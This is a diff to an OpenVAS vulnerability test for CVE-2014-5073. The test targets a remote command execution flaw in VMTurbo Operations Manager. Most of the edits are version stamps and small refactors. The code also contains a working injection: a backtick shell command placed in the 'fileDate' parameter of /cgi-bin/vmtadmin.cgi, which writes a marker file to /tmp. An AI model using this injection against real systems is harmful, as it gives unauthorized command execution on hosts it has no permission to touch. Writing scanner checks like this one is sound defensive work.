@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_vmturbo_operations_manager_69225.nasl 11108 2018-08-24 14:27:07Z mmartin $
+# $Id: gb_vmturbo_operations_manager_69225.nasl 11497 2018-09-20 10:31:54Z mmartin $
 #
 # VMTurbo Operations Manager '/cgi-bin/vmtadmin.cgi' Remote Command Execution Vulnerability
 #
@@ -34,7 +34,7 @@ if (description)
   script_cve_id("CVE-2014-5073");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_version("$Revision: 11108 $");
+  script_version("$Revision: 11497 $");
 
   script_name("VMTurbo Operations Manager '/cgi-bin/vmtadmin.cgi' Remote Command Execution Vulnerability");
 
@@ -42,7 +42,7 @@ if (description)
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/69225");
   script_xref(name:"URL", value:"http://secunia.com/secunia_research/2014-8/");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-08-24 16:27:07 +0200 (Fri, 24 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 12:31:54 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-08-18 14:14:43 +0200 (Mon, 18 Aug 2014)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -71,12 +71,13 @@ vulnerability.");
 
 include("http_func.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
-
+vtstring = get_vt_string();
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 
-rand = 'OpenVAS_' + rand();
+rand = vtstring + '_' + rand();
 cmd = 'echo%20' + rand + '%20>%20/tmp/vmtbackup.zip';
 url = '/cgi-bin/vmtadmin.cgi?callType=DOWN&actionType=CFGBACKUP&fileDate="`' + cmd + '`"';
 
@@ -87,7 +88,7 @@ http_send_recv( port:port, data:req, bodyonly:FALSE ); # execute cmd
 url = '/cgi-bin/vmtadmin.cgi?callType=DOWN&actionType=CFGBACKUP';
 buf = http_send_recv( port:port, data:req, bodyonly:FALSE ); # read result
 
-if( buf =~ 'HTTP/1.. 200' && egrep( pattern:rand, string:buf ) )
+if( buf =~ "^HTTP/1\.[01] 200" && egrep( pattern:rand, string:buf ) )
 {
   security_message( port:port );
   exit( 0 );
